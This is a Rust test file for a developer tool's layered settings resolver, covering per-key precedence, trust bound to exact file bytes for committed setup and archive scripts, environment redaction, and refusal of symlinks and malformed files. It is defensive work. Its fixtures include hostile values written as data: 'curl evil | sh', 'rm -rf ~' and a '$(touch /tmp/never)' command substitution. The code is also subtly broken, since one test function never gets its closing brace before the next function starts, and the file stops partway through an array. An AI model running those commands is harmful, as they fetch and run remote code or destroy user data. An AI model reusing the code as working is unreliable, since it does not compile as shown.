use super::*;

struct Fixture { _home: tempfile::TempDir, repo: tempfile::TempDir, store: Store }
impl Fixture {
    fn new() -> Self {
        let home = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        git(repo.path(), &["init", "-q"]).unwrap();
        std::fs::create_dir(repo.path().join(".terminalx")).unwrap();
        std::fs::write(repo.path().join(".terminalx/.gitignore"), "/settings.local.json\n").unwrap();
        let store = Store { home: home.path().canonicalize().unwrap(), managed_fixture: Some(home.path().join("system-policy-fixture.json")), saved_scripts: Some(Default::default()) };
        Self { _home: home, repo, store }
    }
    fn repository(&self) -> Repository { repository(self.repo.path()).unwrap() }
    fn file(&self, layer: Layer, value: Value) {
        let path = match layer {
            Layer::User => self.store.home.join(SHARED),
            Layer::Managed => self.store.managed_fixture.clone().unwrap(),
            Layer::RepositoryShared => self.repo.path().join(".terminalx").join(SHARED),
            Layer::RepositoryLocal => self.repo.path().join(".terminalx").join(LOCAL),
            Layer::Defaults => unreachable!(),
        };
        std::fs::write(path, serde_json::to_vec(&value).unwrap()).unwrap();
    }
    fn resolve(&self) -> Resolution { self.store.resolve(Some(&self.repository())).unwrap() }
}

#[test]
fn precedence_is_per_key_and_managed_values_cannot_be_written_or_reset() {
    let f = Fixture::new();
    assert_eq!(f.resolve().values["branchPrefix"].source, Layer::Defaults);
    for (layer, prefix) in [(Layer::User, "user/"), (Layer::RepositoryShared, "shared/"), (Layer::RepositoryLocal, "local/"), (Layer::Managed, "managed/")] {
        f.file(layer, json!({"branchPrefix": prefix}));
        let resolved = f.resolve();
        assert_eq!(resolved.values["branchPrefix"].source, layer);
        assert_eq!(resolved.values["branchPrefix"].value, prefix);
        assert_eq!(resolved.values["branchPrefix"].locked, layer == Layer::Managed);
    }
    for layer in [Layer::User, Layer::RepositoryLocal, Layer::RepositoryShared, Layer::Managed] {
        for value in [Some(json!("changed/")), None] {
            assert!(f.store.write(Some(&f.repository()), layer, "branchPrefix", value).is_err());
        }
    }
    assert_eq!(f.resolve().values["branchPrefix"].value, "managed/");
}

#[test]
fn trust_is_bound_to_repository_and_exact_bytes_including_script_changes() {
    let f = Fixture::new();
    f.file(Layer::RepositoryShared, json!({"environment": {"API_URL": "https://example.test"}, "scripts": {"setup": "echo first"}}));
    let untrusted = f.resolve();
    assert!(untrusted.require_trust().is_err());
    // Declining is no write at all, and never becomes implicit consent.
    assert!(f.resolve().require_trust().is_err());
    let hash = untrusted.trust.unwrap().hash;
    f.store.trust(&f.repository(), &hash).unwrap();
    assert!(f.resolve().require_trust().is_ok());
    let another = Fixture::new();
    std::fs::copy(f.store.home.join(TRUST), another.store.home.join(TRUST)).unwrap();
    another.file(Layer::RepositoryShared, json!({"environment": {"API_URL": "https://example.test"}, "scripts": {"setup": "echo first"}}));
    assert!(another.resolve().require_trust().is_err());
    f.file(Layer::RepositoryShared, json!({"environment": {"API_URL": "https://example.test"}, "scripts": {"setup": "echo changed"}}));
    assert!(f.resolve().require_trust().is_err());
    assert!(f.store.trust(&f.repository(), &hash).is_err(), "a stale prompt cannot grant trust");
    assert!(!f.resolve().values.contains_key("scripts"), "pending script dependency must never execute");
}

#[test]
fn invalid_repository_keys_are_ignored_and_warning_does_not_include_values() {
    let f = Fixture::new();
    f.file(Layer::RepositoryShared, json!({"linearApiKey": "secret-marker", "worktreeDir": "/tmp/unsafe", "agents": {"readOnlyCommands": true}, "branchPrefix": "team/"}));
    let r = f.resolve();
    // worktreeDir and branchPrefix, plus the three script defaults every repository has.
    assert_eq!(r.values.len(), 5);
    assert_eq!(r.warnings.len(), 3);
    assert!(!serde_json::to_string(&r).unwrap().contains("secret-marker"));
    assert!(r.require_trust().is_err(), "cleanup classification also requires trust");
}

#[test]
fn malformed_and_unsafe_files_never_clear_managed_policy_or_overwrite_user_data() {
    let f = Fixture::new();
    f.file(Layer::User, json!({"branchPrefix":"user/"}));
    for bad in ["{broken", "[]", "null", ""] {
        std::fs::write(f.repo.path().join(".terminalx/settings.json"), bad).unwrap();
        assert_eq!(f.resolve().values["branchPrefix"].value, "user/");
        assert_eq!(f.resolve().warnings.len(), 1);
        assert!(f.store.write(Some(&f.repository()), Layer::RepositoryShared, "branchPrefix", Some(json!("fixed/"))).is_err());
        std::fs::write(f.store.managed_fixture.clone().unwrap(), bad).unwrap();
        assert!(f.store.resolve(Some(&f.repository())).is_err());
        std::fs::remove_file(f.store.managed_fixture.clone().unwrap()).unwrap();
    }
    f.file(Layer::Managed, json!({"branchPrefix": "invalid prefix"}));
    assert!(f.store.resolve(None).is_err());
}

#[test]
fn local_writes_are_ignored_private_atomic_and_preserve_unrelated_user_fields() {
    let f = Fixture::new();
    std::fs::remove_file(f.repo.path().join(".terminalx/.gitignore")).unwrap();
    f.file(Layer::User, json!({"futureField": {"hello": true}, "notifications": false}));
    f.store.write(None, Layer::User, "branchPrefix", Some(json!("mine/"))).unwrap();
    let user = object(&std::fs::read(f.store.home.join(SHARED)).unwrap()).unwrap();
    assert_eq!(user["futureField"]["hello"], true);
    assert_eq!(user["notifications"], false);
    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, "branchPrefix", Some(json!("local/"))).unwrap();
    assert!(git(f.repo.path(), &["check-ignore", ".terminalx/settings.local.json"]).is_ok());
    assert_eq!(f.resolve().values["branchPrefix"].value, "local/");
    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, "branchPrefix", None).unwrap();
    assert_eq!(f.resolve().values["branchPrefix"].value, "mine/");
    #[cfg(unix)] {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(f.repo.path().join(".terminalx/settings.local.json")).unwrap().permissions().mode() & 0o777, 0o600);
    }
}

#[test]
fn tracked_local_config_cannot_bypass_shared_trust() {
    let f = Fixture::new();
    f.file(Layer::RepositoryLocal, json!({"environment":{"API_URL":"untrusted"}}));
    git(f.repo.path(), &["add", "-f", ".terminalx/settings.local.json"]).unwrap();
    assert!(f.store.resolve(Some(&f.repository())).is_err());
    assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, "branchPrefix", Some(json!("local/"))).is_err());
}

#[test]
fn environment_is_literal_validated_per_variable_and_redacted_on_every_read_surface() {
    let f = Fixture::new();
    f.file(Layer::RepositoryShared, json!({"environment":{"API_URL":"$(touch /tmp/never)","SHARED":"shared"}}));
    f.file(Layer::RepositoryLocal, json!({"environment":{"API_URL":"local"}}));
    f.file(Layer::Managed, json!({"environment":{"SHARED":"managed"}}));
    let r = f.resolve();
    assert!(r.require_trust().is_ok(), "no shared value is effective");
    assert_eq!(r.values["environment.API_URL"].source, Layer::RepositoryLocal);
    assert_eq!(r.values["environment.SHARED"].source, Layer::Managed);
    assert!(r.values["environment.SHARED"].locked);
    let redacted = r.redacted();
    assert!(redacted.values["environment.API_URL"].value.is_null());
    assert!(redacted.values["environment.API_URL"].redacted);
    f.file(Layer::RepositoryShared, json!({"environment":{"PATH":"unsafe", "OK":"also ignored"}}));
    assert_eq!(f.resolve().warnings.len(), 1);
    assert!(!f.resolve().values.contains_key("environment.OK"));
}

#[cfg(unix)]
#[test]
fn symlinks_special_files_and_oversized_config_are_refused() {
    use std::os::unix::fs::symlink;
    let f = Fixture::new();
    let victim = f.store.home.join("victim");
    std::fs::write(&victim, b"untouched").unwrap();
    let local = f.repo.path().join(".terminalx/settings.local.json");
    symlink(&victim, &local).unwrap();
    assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, "branchPrefix", Some(json!("bad/"))).is_err());
    assert_eq!(std::fs::read(&victim).unwrap(), b"untouched");
    std::fs::remove_file(local).unwrap();
    let shared = f.repo.path().join(".terminalx/settings.json");
    std::fs::write(&shared, vec![b' '; super::super::config_files::MAX_BYTES as usize + 1]).unwrap();
    assert!(f.store.resolve(Some(&f.repository())).is_err());
    std::fs::remove_file(&shared).unwrap();
    std::fs::create_dir(&shared).unwrap();
    assert!(f.store.resolve(Some(&f.repository())).is_err());
    std::fs::remove_dir_all(f.repo.path().join(".terminalx")).unwrap();
    symlink(&f.store.home, f.repo.path().join(".terminalx")).unwrap();
    assert!(f.store.resolve(Some(&f.repository())).is_err());
}

#[test]
fn linked_worktrees_inherit_primary_checkout_local_overrides_and_trust_identity() {
    let f = Fixture::new();
    f.file(Layer::RepositoryLocal, json!({"branchPrefix":"local/", "environment":{"API_URL":"local"}}));
    git(f.repo.path(), &["-c", "user.name=Fixture", "-c", "user.email=fixture@example.test", "commit", "--allow-empty", "-qm", "fixture"]).unwrap();
    let workspace = f.repo.path().join("workspace");
    git(f.repo.path(), &["worktree", "add", "-qb", "workspace", workspace.to_str().unwrap()]).unwrap();
    let linked = repository(&workspace).unwrap();
    assert_eq!(linked.identity, f.repository().identity);
    assert_eq!(linked.root, f.repository().root);
    assert_eq!(f.store.resolve(Some(&linked)).unwrap().values["environment.API_URL"].value, "local");
}

#[test]
fn unrelated_settings_saves_preserve_concurrent_layered_writes_and_resets() {
    let _home = super::super::temp_home();
    let store = Store::current().unwrap();
    let mut old = super::super::settings::load();
    store.write(None, Layer::User, "branchPrefix", Some(json!("new/"))).unwrap();
    old.notifications = false;
    super::super::settings::save(&old).unwrap();
    assert_eq!(store.resolve(None).unwrap().values["branchPrefix"].value, "new/");
    let old = super::super::settings::load();
    store.write(None, Layer::User, "branchPrefix", None).unwrap();
    super::super::settings::save(&old).unwrap();
    assert_eq!(store.resolve(None).unwrap().values["branchPrefix"].source, Layer::Defaults);
}

#[test]
fn legacy_empty_prefix_still_disables_cleanup_and_an_invalid_sibling_keeps_the_path() {
    let f = Fixture::new();
    f.file(Layer::User, json!({"branchPrefix":"", "worktreeDir":"custom", "notifications":"invalid"}));
    let resolved = f.resolve();
    assert_eq!(resolved.values["branchPrefix"].value, "");
    // settings::file recovers fields one by one (PRO-140), as the resolver does.
    assert_eq!(resolved.values["worktreeDir"].source, Layer::User);
    assert_eq!(resolved.values["worktreeDir"].value, "custom");
    f.file(Layer::Managed, json!({"worktreeDir":"forbidden"}));
    assert!(f.store.resolve(None).is_err(), "non-lockable keys cannot be pinned by policy");
}

#[test]
fn read_surfaces_include_private_sources_without_reading_secrets_or_requesting_shadowed_trust() {
    let _home = super::super::temp_home();
    let mut f = Fixture::new();
    f.store = Store::current().unwrap();
    f.file(Layer::RepositoryShared, json!({"environment":{"API_URL":"shared"}}));
    let key = format!("repository:{}", f.repository().identity);
    std::fs::write(f.store.home.join("environment.json"), serde_json::to_vec(&json!({key: {"names":["API_URL"],"revision":"no-secret-store-read"}})).unwrap()).unwrap();
    let resolved = view(f.repo.path().to_str()).unwrap();
    assert!(resolved.require_trust().is_ok());
    assert_eq!(resolved.values["environment.API_URL"].source, Layer::RepositoryLocal);
    assert!(resolved.values["environment.API_URL"].redacted);
    assert!(resolved.values["environment.API_URL"].value.is_null());
    std::fs::write(f.store.home.join("environment.json"), b"invalid").unwrap();
    let resolved = view(f.repo.path().to_str()).unwrap();
    assert!(resolved.require_trust().is_err(), "missing metadata cannot grant trust");
    assert!(resolved.warnings.iter().any(|warning| warning.contains("Private environment")));
}

#[test]
fn user_state_cannot_supply_or_remove_system_policy() {
    let f = Fixture::new();
    f.file(Layer::Managed, json!({"branchPrefix": "admin/"}));
    let impostor = f.store.home.join("managed-settings.json");
    std::fs::write(&impostor, br#"{"branchPrefix":"bypass/"}"#).unwrap();
    assert_eq!(f.resolve().values["branchPrefix"].value, "admin/");
    std::fs::remove_file(impostor).unwrap();
    assert_eq!(f.resolve().values["branchPrefix"].value, "admin/");
}

#[test]
fn sparse_checkout_accepts_repository_folders_and_refuses_anything_else() {
    let accepted = [json!([]), json!(["src"]), json!(["packages/web", "docs", "a.b/c-d_e", "naïve dir/x"]), json!(["app/[locale]", "!important", "a]b"]),
        json!(["a".repeat(SPARSE_CHECKOUT_MAX_PATH)]),
        Value::Array((0..SPARSE_CHECKOUT_MAX_FOLDERS).map(|n| json!(format!("f{n}"))).collect())];
    for value in accepted {
        assert!(valid("sparseCheckout", &value, Layer::RepositoryLocal), "{value}");
    }
    let refused = [json!(null), json!("src"), json!({"src": true}), json!([1]), json!([null]), json!([""]),
        json!(["/src"]), json!(["src/"]), json!(["a//b"]), json!(["."]), json!(["./a"]), json!(["a/.."]), json!(["../a"]),
        json!(["a\\b"]), json!(["a*"]), json!(["a?"]), json!(["app/[...slug]*"]), json!(["a\nb"]), json!(["a\tb"]), json!(["a\u{7f}"]),
        json!(["src", "src"]), json!(["a".repeat(SPARSE_CHECKOUT_MAX_PATH + 1)]),
        Value::Array((0..=SPARSE_CHECKOUT_MAX_FOLDERS).map(|n| json!(format!("f{n}"))).collect())];
    for value in refused {
        assert!(!valid("sparseCheckout", &value, Layer::RepositoryLocal), "{value}");
    }
    let registration = REGISTRY.iter().find(|r| r.key == "sparseCheckout").unwrap();
    assert!(registration.repository_configurable && registration.managed_lockable && !registration.requires_trust);
}

#[test]
fn sparse_checkout_is_written_to_the_shared_file_and_needs_no_trust() {
    let f = Fixture::new();
    assert!(!f.resolve().values.contains_key("sparseCheckout"), "absent means a full checkout");
    f.store.write(Some(&f.repository()), Layer::RepositoryShared, "sparseCheckout", Some(json!(["src", "docs/api"]))).unwrap();
    let written: Value = serde_json::from_slice(&std::fs::read(f.repo.path().join(".terminalx").join(SHARED)).unwrap()).unwrap();
    assert_eq!(written, json!({"sparseCheckout": ["src", "docs/api"]}));
    let resolved = f.resolve();
    assert_eq!(resolved.values["sparseCheckout"].value, json!(["src", "docs/api"]));
    assert_eq!(resolved.values["sparseCheckout"].source, Layer::RepositoryShared);
    assert!(resolved.require_trust().is_ok(), "a folder list executes nothing");
    assert!(f.store.write(Some(&f.repository()), Layer::RepositoryShared, "sparseCheckout", Some(json!(["../outside"]))).is_err());
    f.store.write(Some(&f.repository()), Layer::RepositoryShared, "sparseCheckout", Some(json!([]))).unwrap();
    assert_eq!(f.resolve().values["sparseCheckout"].value, json!([]), "root files only");
    f.store.write(Some(&f.repository()), Layer::RepositoryShared, "sparseCheckout", None).unwrap();
    assert!(!f.resolve().values.contains_key("sparseCheckout"));
}

#[test]
fn sparse_checkout_is_a_repository_setting_a_user_file_cannot_give_every_repository() {
    let f = Fixture::new();
    f.file(Layer::User, json!({"sparseCheckout": ["src"]}));
    let resolved = f.resolve();
    assert!(!resolved.values.contains_key("sparseCheckout"));
    assert!(resolved.warnings.iter().any(|warning| warning.ends_with("sparseCheckout")));
    // A malformed shared list is ignored with a warning, never half-applied.
    f.file(Layer::RepositoryShared, json!({"sparseCheckout": ["src", "/etc"]}));
    assert!(!f.resolve().values.contains_key("sparseCheckout"));
    f.file(Layer::Managed, json!({"sparseCheckout": ["managed"]}));
    let locked = f.resolve();
    assert_eq!(locked.values["sparseCheckout"].value, json!(["managed"]));
    assert!(locked.values["sparseCheckout"].locked);
fn saved(setup: &str, archive: &str, minutes: Option<u64>) -> super::super::projects::RepositoryScripts {
    super::super::projects::RepositoryScripts { setup: setup.into(), archive: archive.into(), archive_timeout_minutes: minutes }
}

#[test]
fn scripts_resolve_saved_then_shared_then_local_then_managed() {
    let mut f = Fixture::new();
    let resolved = f.resolve();
    assert_eq!((resolved.setup_script().unwrap(), resolved.archive_script().unwrap()), (String::new(), ArchiveScript { script: String::new(), timeout: Duration::from_secs(300) }));
    assert_eq!(f.resolve().values[SETUP_SCRIPT].source, Layer::Defaults);
    f.store.saved_scripts = Some(saved("saved setup", "saved archive", Some(2)));
    let resolved = f.resolve();
    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::User);
    assert_eq!(resolved.setup_script().unwrap(), "saved setup");
    assert_eq!(resolved.archive_script().unwrap(), ArchiveScript { script: "saved archive".into(), timeout: Duration::from_secs(120) });

    f.file(Layer::RepositoryShared, json!({SETUP_SCRIPT: "shared setup", ARCHIVE_TIMEOUT: 10}));
    let hash = f.resolve().trust.unwrap().hash;
    f.store.trust(&f.repository(), &hash).unwrap();
    let resolved = f.resolve();
    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::RepositoryShared);
    assert_eq!(resolved.values[ARCHIVE_SCRIPT].source, Layer::User, "precedence is per key");
    assert_eq!(resolved.archive_script().unwrap().timeout, Duration::from_secs(600));

    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, SETUP_SCRIPT, Some(json!("local setup"))).unwrap();
    let resolved = f.resolve();
    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::RepositoryLocal);
    assert_eq!(resolved.setup_script().unwrap(), "local setup");

    f.file(Layer::Managed, json!({ARCHIVE_SCRIPT: "managed archive"}));
    let resolved = f.resolve();
    assert!(resolved.values[ARCHIVE_SCRIPT].locked);
    assert_eq!(resolved.archive_script().unwrap().script, "managed archive");
    assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, Some(json!("mine"))).unwrap_err().to_string().contains("locked"));
}

#[test]
fn an_untrusted_committed_script_is_refused_until_trusted_or_overridden() {
    let f = Fixture::new();
    f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "docker compose down", ARCHIVE_TIMEOUT: 2}));
    let resolved = f.resolve();
    let trust = resolved.trust.as_ref().unwrap();
    assert!(trust.required);
    assert_eq!(trust.keys, vec![ARCHIVE_SCRIPT.to_string()], "a timeout runs nothing, so it needs no trust");
    let error = resolved.archive_script().unwrap_err().to_string();
    assert!(error.contains("archive script that is not trusted"), "{error}");
    assert_eq!(resolved.setup_script().unwrap(), "", "the setup script is not held up by the archive script's trust");

    // A local override replaces the committed command, so nothing untrusted runs.
    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, Some(json!("echo mine"))).unwrap();
    assert_eq!(f.resolve().archive_script().unwrap().script, "echo mine");
    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, None).unwrap();
    assert!(f.resolve().archive_script().is_err());

    f.store.trust(&f.repository(), &resolved.trust.unwrap().hash).unwrap();
    assert_eq!(f.resolve().archive_script().unwrap(), ArchiveScript { script: "docker compose down".into(), timeout: Duration::from_secs(120) });
    // Editing the committed file needs trust again.
    f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "rm -rf ~", ARCHIVE_TIMEOUT: 2}));
    assert!(f.resolve().archive_script().is_err());
}

#[test]
fn each_script_is_trust_checked_on_its_own() {
    let mut f = Fixture::new();
    f.store.saved_scripts = Some(saved("my setup", "my archive", None));
    // An untrusted committed archive script leaves the person's own setup running.
    f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "committed archive"}));
    let resolved = f.resolve();
    assert_eq!(resolved.setup_script().unwrap(), "my setup");
    assert!(resolved.archive_script().is_err());
    // And an untrusted committed setup script leaves their own archive script running.
    f.file(Layer::RepositoryShared, json!({SETUP_SCRIPT: "committed setup"}));
    let resolved = f.resolve();
    assert!(resolved.setup_script().unwrap_err().to_string().contains("setup script that is not trusted"));
    assert_eq!(resolved.archive_script().unwrap().script, "my archive");
}

#[test]
fn scripts_never_come_from_the_global_settings_file_and_invalid_values_are_ignored() {
    let f = Fixture::new();
    f.file(Layer::User, json!({SETUP_SCRIPT: "everywhere", ARCHIVE_TIMEOUT: 2}));
    let resolved = f.resolve();
    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::Defaults);
    assert_eq!(resolved.values[ARCHIVE_TIMEOUT].source, Layer::Defaults);
    assert!(resolved.warnings.iter().any(|w| w.contains(SETUP_SCRIPT)));
    assert!(f.store.write(Some(&f.repository()), Layer::User, SETUP_SCRIPT, Some(json!("x"))).is_err());
    f.file(Layer::RepositoryShared, json!({ARCHIVE_TIMEOUT: 3, SETUP_SCRIPT: 7, ARCHIVE_SCRIPT: "a\u{0}b"}));
    let resolved = f.resolve();
    assert_eq!(resolved.values[ARCHIVE_TIMEOUT].value, json!(DEFAULT_ARCHIVE_TIMEOUT_MINUTES));
    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::Defaults);
    assert_eq!(resolved.values[ARCHIVE_SCRIPT].source, Layer::Defaults);
    assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_TIMEOUT, Some(json!(3))).is_err());
}

#[test]
fn scripts_outside_a_repository_use_only_the_saved_store() {
    let _home = super::super::temp_home();
    let folder = tempfile::tempdir().unwrap();
    let path = super::super::projects::add(folder.path().to_str().unwrap()).unwrap().path;
    super::super::projects::update(&path, super::super::projects::ProjectPatch { scripts: Some(saved("s", "a", Some(15))), ..Default::default() }).unwrap();
    assert_eq!(setup_script(folder.path()).unwrap(), "s");
    assert_eq!(archive_script(folder.path()).unwrap(), ArchiveScript { script: "a".into(), timeout: Duration::from_secs(900) });
    std::fs::create_dir(folder.path().join(".terminalx")).unwrap();
    assert!(setup_script(folder.path()).is_err(), "repository files that cannot be resolved are not skipped");
    assert!(archive_script(folder.path()).is_err());
}

#[test]
fn trust_given_before_scripts_were_supported_does_not_let_them_run() {
    let f = Fixture::new();
    let bytes = serde_json::to_vec(&json!({"branchPrefix": "team/", SETUP_SCRIPT: "curl evil | sh"})).unwrap();
    std::fs::write(f.repo.path().join(".terminalx").join(SHARED), &bytes).unwrap();
    // What an earlier version recorded when this file was trusted: the plain digest of its bytes.
    let old = BTreeMap::from([(f.repository().identity, digest(&bytes))]);
    std::fs::write(f.store.home.join(TRUST), serde_json::to_vec(&old).unwrap()).unwrap();
    let resolved = f.resolve();
    assert!(resolved.trust.as_ref().unwrap().required, "the old approval never showed the script");
    assert!(resolved.setup_script().is_err());
    f.store.trust(&f.repository(), &resolved.trust.unwrap().hash).unwrap();
    assert_eq!(f.resolve().setup_script().unwrap(), "curl evil | sh");

    // A file without scripts keeps the approval it already has.
    let plain = serde_json::to_vec(&json!({"branchPrefix": "team/"})).unwrap();
    std::fs::write(f.repo.path().join(".terminalx").join(SHARED), &plain).unwrap();
    let old = BTreeMap::from([(f.repository().identity, digest(&plain))]);
    std::fs::write(f.store.home.join(TRUST), serde_json::to_vec(&old).unwrap()).unwrap();
    assert!(!f.resolve().trust.unwrap().required);
}

fn lines(text: &str) -> String { text.replace('\'', "\"") }

#[test]
fn each_value_lists_every_layer_that_supplies_it_highest_first_with_environment_redacted() {
    let f = Fixture::new();
    f.file(Layer::User, json!({"branchPrefix": "user/"}));
    f.file(Layer::RepositoryShared, json!({"branchPrefix": "shared/", "environment": {"API_URL": "secret-shared", "ONLY_SHARED": "secret-only"}}));
    f.file(Layer::RepositoryLocal, json!({"branchPrefix": "local/", "environment": {"API_URL": "secret-local"}}));
    let (resolution, layers) = f.store.resolve_layers(Some(&f.repository())).unwrap();
    let layered = LayeredResolution::new(resolution.redacted(), layers);
    let prefix = &layered.values["branchPrefix"];
    assert_eq!(prefix.resolved.source, Layer::RepositoryLocal);
    assert_eq!(prefix.layers, vec![
        LayerValue { layer: Layer::RepositoryLocal, value: json!("local/"), redacted: false },
        LayerValue { layer: Layer::RepositoryShared, value: json!("shared/"), redacted: false },
        LayerValue { layer: Layer::User, value: json!("user/"), redacted: false },
        LayerValue { layer: Layer::Defaults, value: json!("raccoon/"), redacted: false },
    ]);
    let api = &layered.values["environment.API_URL"];
    assert_eq!(api.layers.iter().map(|l| l.layer).collect::<Vec<_>>(), [Layer::RepositoryLocal, Layer::RepositoryShared]);
    assert!(api.layers.iter().all(|l| l.value.is_null() && l.redacted));
    assert_eq!(layered.values["worktreeDir"].layers.len(), 1, "only the defaults supply it");
    let wire = serde_json::to_string(&layered).unwrap();
    assert!(!wire.contains("secret-"), "{wire}");
    assert!(wire.contains("\"layers\":[{\"layer\":\"repositoryLocal\""), "{wire}");
}

#[test]
fn settings_files_name_each_layer_its_git_state_and_its_first_problem_without_values() {
    let f = Fixture::new();
    std::fs::write(f.repo.path().join(".terminalx/settings.json"), lines("{\n  '$schema': 'x',\n  'branchPrefix': 'team/',\n  'linearApiKey': 'secret-marker'\n}")).unwrap();
    std::fs::write(f.store.home.join(SHARED), lines("{\n  'linearApiKey': 'secret-marker',\n  'notifications': 'secret-marker'\n}")).unwrap();
    let files = f.store.files(Some(&f.repository()));
    assert_eq!(files.iter().map(|file| file.layer).collect::<Vec<_>>(), [Layer::Managed, Layer::RepositoryLocal, Layer::RepositoryShared, Layer::User, Layer::Defaults]);
    let [managed, local, shared, user, defaults] = &files[..] else { unreachable!() };
    assert!(!managed.exists && managed.problem.is_none());
    assert!(!local.exists && local.git == Some(GitState::Ignored) && local.problem.is_none());
    assert!(shared.exists && shared.keys == 2 && shared.git == Some(GitState::Untracked));
    assert_eq!(shared.problem, Some(Problem { key: Some("linearApiKey".into()), line: Some(4), message: "isn’t a setting".into(), effect: Effect::IgnoredKey }));
    assert!(shared.display_path.as_deref().unwrap().ends_with(".terminalx/settings.json"));
    assert_eq!(user.problem, Some(Problem { key: Some("notifications".into()), line: Some(3), message: "expected true or false".into(), effect: Effect::LastGood }));
    assert!(user.exists && user.keys == 2 && user.git.is_none());
    assert!(defaults.exists && defaults.path.is_none() && defaults.keys > 10);
    let wire = serde_json::to_string(&files).unwrap();
    assert!(!wire.contains("secret-marker") && !wire.contains("team/"), "{wire}");

    // Committed shared, malformed: none of its values apply, and the parser's line.
    std::fs::write(f.repo.path().join(".terminalx/settings.json"), lines("{\n  'branchPrefix': 'team/',\n}")).unwrap();
    git(f.repo.path(), &["add", ".terminalx/settings.json"]).unwrap();
    git(f.repo.path(), &["-c", "user.name=Fixture", "-c", "user.email=fixture@example.test", "commit", "-qm", "shared"]).unwrap();
    let files = f.store.files(Some(&f.repository()));
    let shared = files.iter().find(|file| file.layer == Layer::RepositoryShared).unwrap();
    assert_eq!(shared.git, Some(GitState::Committed));
    let problem = shared.problem.clone().unwrap();
    assert_eq!((problem.key, problem.line, problem.effect), (None, Some(3), Effect::FileIgnored));

    // Malformed local and managed files block; a key policy may not set names itself.
    f.file(Layer::Managed, json!({"worktreeDir": "/elsewhere"}));
    std::fs::write(f.repo.path().join(".terminalx/settings.local.json"), "{").unwrap();
    let files = f.store.files(Some(&f.repository()));
    assert_eq!(files[0].problem, Some(Problem { key: Some("worktreeDir".into()), line: Some(1), message: "isn’t a setting".into(), effect: Effect::Blocked }));
    assert_eq!(files[1].problem.as_ref().map(|p| p.effect), Some(Effect::Blocked));
    assert!(f.store.files(None).iter().all(|file| !matches!(file.layer, Layer::RepositoryLocal | Layer::RepositoryShared)));
}

#[test]
fn writes_add_the_schema_reference_except_to_the_shared_file_and_keep_one_the_person_wrote() {
    let f = Fixture::new();
    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, "branchPrefix", Some(json!("local/"))).unwrap();
    let local = object(&std::fs::read(f.repo.path().join(".terminalx/settings.local.json")).unwrap()).unwrap();
    assert_eq!(local["$schema"], schema::REPOSITORY_SCHEMA_REFERENCE);
    let resolved = f.resolve();
    assert!(resolved.warnings.is_empty(), "$schema is not a setting: {:?}", resolved.warnings);
    assert!(f.store.files(Some(&f.repository()))[1].problem.is_none());
    f.store.write(Some(&f.repository()), Layer::RepositoryShared, "branchPrefix", Some(json!("team/"))).unwrap();
    let shared = object(&std::fs::read(f.repo.path().join(".terminalx/settings.json")).unwrap()).unwrap();
    assert!(!shared.contains_key("$schema"), "older builds would warn every teammate about a committed $schema");
    f.file(Layer::RepositoryShared, json!({"$schema": "./mine.json"}));
    f.store.write(Some(&f.repository()), Layer::RepositoryShared, "branchPrefix", Some(json!("team/"))).unwrap();
    let shared = object(&std::fs::read(f.repo.path().join(".terminalx/settings.json")).unwrap()).unwrap();
    assert_eq!((&shared["$schema"], &shared["branchPrefix"]), (&json!("./mine.json"), &json!("team/")));
    f.store.write(None, Layer::User, "branchPrefix", Some(json!("mine/"))).unwrap();
    assert_eq!(object(&std::fs::read(f.store.home.join(SHARED)).unwrap()).unwrap()["$schema"], schema::USER_SCHEMA_REFERENCE);
    f.file(Layer::Managed, json!({"$schema": "x", "branchPrefix": "admin/"}));
    assert_eq!(f.resolve().values["branchPrefix"].value, "admin/", "policy may carry $schema too");
}

#[test]
fn the_repository_schema_says_what_the_resolver_accepts() {
    let schema = repository_schema();
    let prefix = &schema["properties"]["branchPrefix"];
    let pattern = regex::Regex::new(prefix["pattern"].as_str().unwrap()).unwrap();
    let max = prefix["maxLength"].as_u64().unwrap() as usize;
    let long = "a".repeat(129);
    for sample in ["", "team/", "a/b", "a/b/", "a_b-c/d9", "/a", "a//b", "-a", "a/-b", "a b", "ä/", "a/b//", long.as_str()] {
        let by_schema = sample.chars().count() <= max && pattern.is_match(sample);
        assert_eq!(by_schema, valid("branchPrefix", &json!(sample), Layer::RepositoryShared), "{sample:?}");
    }
    let names = &schema["properties"]["environment"]["propertyNames"];
    let name_pattern = regex::Regex::new(names["pattern"].as_str().unwrap()).unwrap();
    let reserved = names["not"]["anyOf"][0]["enum"].as_array().unwrap();
    let prefixes = regex::Regex::new(names["not"]["anyOf"][1]["pattern"].as_str().unwrap()).unwrap();
    for name in ["API_URL", "_X", "PATH", "TERMINALX_TOKEN", "DYLD_X", "lower", "9X"] {
        let by_schema = name_pattern.is_match(name) && !reserved.contains(&json!(name)) && !prefixes.is_match(name);
        assert_eq!(by_schema, valid("environment", &json!({name: "v"}), Layer::RepositoryShared), "{name}");
    }
    let folders = &schema["properties"]["sparseCheckout"];
    let folder = &folders["items"];
    let folder_pattern = regex::Regex::new(folder["pattern"].as_str().unwrap()).unwrap();
    let folder_max = folder["maxLength"].as_u64().unwrap() as usize;
    let long_folder = "a".repeat(SPARSE_CHECKOUT_MAX_PATH + 1);
    for sample in ["src", "packages/web", "a.b/c-d_e", "naïve dir/x", "app/[locale]", "!important", "...", ".a/b.", "a/..b", "", "/src", "src/",
